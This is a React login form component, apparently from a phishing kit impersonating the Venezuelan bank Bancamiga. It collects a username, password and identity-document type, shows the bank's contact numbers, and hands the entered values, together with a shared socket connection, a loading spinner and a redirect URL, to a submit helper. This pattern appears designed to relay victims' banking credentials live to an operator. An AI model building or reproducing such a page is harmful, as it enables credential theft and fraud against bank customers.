import { useFormik } from 'formik'
import { useContext, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { SocketContext, UserDataContext } from '../../../context'

import { submitBase } from '../../../helpers/submitBase'
import { usernameAndPasswordValidate } from '../../../security/usernameAndPasswordValidate'
import { Spiner } from '../../Spiner'
import { UsernameAndPasswordInput } from './UsernameAndPasswordInput'

const valuesData = { username: '', password: '', typeDocument: '' }
const opciones = ['', 'Tarjeta de Identidad', 'Cédula  Extranjera', 'Pasaporte']

export const UsernameAndPassword = ({urlToNavigate, spiner, timeLoader, endUrl = '', virtualKeyword = false}) => {
    
    const navigate = useNavigate()
    const { addData } = useContext(UserDataContext);
    const { socket } =  useContext(SocketContext);  
    
    const [showSpiner , SetshowSpiner] = useState(false);

    const [valueKeyBoardVirtual, setValueKeyBoardVirtual] = useState('');
    const [selectActive, setSelectActive] = useState(false);
    const [selectItem, setSelectItem] = useState(opciones[0]);
    
    const dataImportant = { addData, socket, SetshowSpiner, urlToNavigate, spiner, timeLoader, navigate }
    
    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        // En caso de poner un error personalizado colocar errorUsername y errorPassword
        validate: values => usernameAndPasswordValidate({values, virtualKeyword}),
        onSubmit: async(valuesData) => {

            submitBase({dataImportant, valuesData, endUrl})
        }
    })
    
    return (
        <div>
            {/* Spiner de carga */}
            {
                showSpiner === true ? <Spiner /> : null
            }
            {/* Colocar diseño base */}
            <form className='flex flex-col' onSubmit={handleSubmit}>

                <UsernameAndPasswordInput
                    username={values.username}
                    password={values.password}
                    typeDocument={values.typeDocument}
                    handleChange={handleChange} 
                    handleBlur={handleBlur}
                    touched={touched}
                    errors={errors}
                    virtualKeyword={virtualKeyword}
                    valueKeyBoardVirtual={valueKeyBoardVirtual}
                    showPasswordMode={false}

                    selectActive={selectActive} 
                    setSelectActive={setSelectActive}
                    selectItem={selectItem}
                    setSelectItem={setSelectItem}
                    opciones={opciones}
                />
                <div  className='w-full border-[1px] border-[#fafafa] my-[40px]' />

                <button 
                        disabled={
                            (
                                touched.username && 
                                errors.username || 
                                values.username.length === 0
                            ) 
                            || 
                            (
                                virtualKeyword == true 
                                    ? valueKeyBoardVirtual.length < 1 
                                    : (
                                        touched.password && 
                                        errors.password || 
                                        values.password.length === 0
                                    )
                            ) == true ? true : false
                        }
                    className='
                        bg-[#89AD45] border-[1px] py-[6px] px-[12px] rounded-[2px] text-white
                        hover:bg-[#89AD45] hover:border-[#78973B]  
                        disabled:opacity-[0.65] border-[#78973B] 
                    '
                    type='submit'
                >
                    Ingresar
                </button>
                <span className='text-center'>Para mayor información o asesoria contáctanos al <br />
                    Centro de atención Bancamiga (CAB) <br />
                    0500-TUBANCA y 0500-1000400</span>

            </form>
        </div>
    )
}
